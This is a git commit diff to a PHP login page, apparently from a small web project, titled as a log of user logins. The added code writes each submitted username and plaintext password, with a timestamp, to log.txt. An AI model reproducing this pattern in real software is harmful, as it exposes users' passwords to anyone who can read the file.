e09d0c4a203de2994be69621072f6d28b32ea2b9
h-aziz <hasib.aziz23@gmail.com>
2018-03-05 22:17:19 -0500

    final edit for log file on new users and existing users login

--- login.php
+++ login.php
@@ -46,6 +46,24 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
 
 }
 ?>
+<?php
+
+ if(isset($_POST['register']))
+ {
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+  $date = new DateTime();
+  $date = $date->format("y:m:d h:i:s");
+  $text = $date . "Existing User Login" . " Username = " . $username . " , " . "Password = " . $password . "\n";
+  $fp = fopen('log.txt', 'a+');
+
+    if(fwrite($fp, $text))  {
+        echo 'saved';
+
+    }
+fclose ($fp);
+}
+?>
 <html >
 <head>
     <title>Login</title>
